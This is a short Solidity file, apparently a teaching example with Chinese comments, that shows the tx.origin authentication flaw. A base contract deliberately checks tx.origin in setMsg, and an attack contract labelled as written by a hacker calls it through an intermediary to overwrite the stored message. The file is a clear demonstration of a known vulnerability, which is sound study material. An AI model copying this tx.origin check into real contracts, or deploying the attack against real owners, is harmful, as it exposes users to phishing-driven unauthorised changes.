// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/// @dev 基础合约
contract BaseContract {
    address owner;
    string message;

    constructor() {
        owner = msg.sender;
    }

    function setMsg(string memory _message) external {
        require(tx.origin == owner, "No permission.");  // 使用tx.origin进行身份验证
        message = _message;
    }

    function getMsg() external view returns (string memory) {
        return message;
    }

    function getOwner() external view returns (address) {
        return owner;
    }
}

/// @dev 攻击合约（黑客编写）
contract Attack {
    BaseContract bc;

    constructor(BaseContract _bcAddr) {
        bc = BaseContract(_bcAddr);
    }

    function attack() external {
        bc.setMsg("The data is attacked.");
    }
}